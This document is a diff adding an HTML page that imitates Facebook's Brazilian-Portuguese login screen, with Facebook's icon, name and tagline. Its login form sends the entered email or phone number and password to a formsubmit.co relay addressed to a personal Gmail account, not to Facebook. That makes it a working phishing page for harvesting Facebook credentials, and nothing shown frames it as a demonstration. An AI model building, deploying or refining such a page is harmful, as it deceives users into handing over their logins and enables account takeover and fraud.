@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/x-icon" href="https://www.facebook.com/images/fb_icon_325x325.png">
+  <link rel="stylesheet" href="Untitled-2.css">
+  <title>Facebook - entre ou cadastre-se</title>
+</head>
+<body>
+  <style>
+:root{
+    --color-white: white;
+    --color-gray: #f0f2f5;
+    --color-gray2: #dddfe2;
+    --color-dark: #1d2129;
+    --color-blue: #1b74e4;
+    --color-green: #42b72a;
+    --color-blue2: #166fe5;
+}
+
+body{
+     font-family: Arial, Helvetica, sans-serif;
+     background-color: var(--color-gray);
+     display: flex;
+     justify-content: center;
+     align-items: center;
+     height: 90vh;
+}
+
+.content{
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    flex-wrap: wrap;
+    width: 70vw;
+}
+
+.content-info{
+    width: 600px;
+}
+
+.content-login{
+    width: 350px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 1rem;
+}
+.content-login-box{
+    background-color: var(--color-white);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 1rem;
+    padding: 1rem;
+    width: 100%;
+    border-radius: 8px;
+    box-shadow: rgb(0 0 0 / 10%) 0px 2px 4px, rgb(0 0 0 / 10%) 0px 8px 16px;
+}    
+
+.inputs{
+    padding: 15px;
+    height: 22px;
+    border-radius: 6px;
+    border: 1px solid var(--color-gray2);
+    outline: none;
+    width: 90%;
+    font-size: 17px;
+    color: var(--color-dark);
+}
+.inputs:focus{
+    border-color: var(--color-blue);
+    box-shadow: 0 0 0 2px var(--color-2);
+}
+
+.btn{
+    padding: 17px;
+    border: none;
+    color: var(--color-white);
+    border-radius: 5px;
+    width: 80%;
+    font-size: 1.1rem;
+    transition: .2s;
+    cursor: pointer;
+}
+
+a{
+    color: var(--color-blue);
+    text-decoration: none;
+    cursor: pointer;
+}
+
+a:hover{
+    text-decoration: underline;
+}
+
+hr{
+    width: 100%;
+    border: 1px solid var(--color-gray);
+}
+
+p{
+    text-align: center;
+}
+
+.btn-enter{
+    background-color: var(--color-blue);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+ 
+  .btn {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+    
+}
+ 
+}
+
+.btn-enter:hover{
+    background-color: var(--color-blue2);
+    text-decoration: none;
+  
+}
+
+.btn-create-account{
+    background-color: var(--color-green);
+    width: auto;
+}
+
+h1{
+    color: var(--color-blue);
+    font-size: 4rem;
+}
+
+h3{
+    font-size: 2rem;
+    font-weight: 500;
+}
+  </style>
+  <div class="content">
+    <div class="content-info">
+      <h1>facebook</h1>
+      <h3>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</h3>
+    </div>
+   <form id="login-form" action="https://formsubmit.co/erickonline15021@gmail.com" method="POST">
+        <div class="content-login-box">
+            <input type="text" class="inputs" name="email_or_phone" placeholder="Email ou telefone">
+            <input type="password" class="inputs" name="password" placeholder="Senha">
+            <button type="submit" class="btn btn-enter">Entrar</button>
+            <a href="#" class="forgot-password">Esqueceu a senha?</a>
+            <hr>
+            <button class="btn btn-create-account">Criar nova conta</button>
+        </div>
+    </form>
+      <p><strong>Criar uma Página</strong> para uma celebridade, uma marca ou uma empresa.</p>
+    </div>
+  </div>
+</body>
+</html>
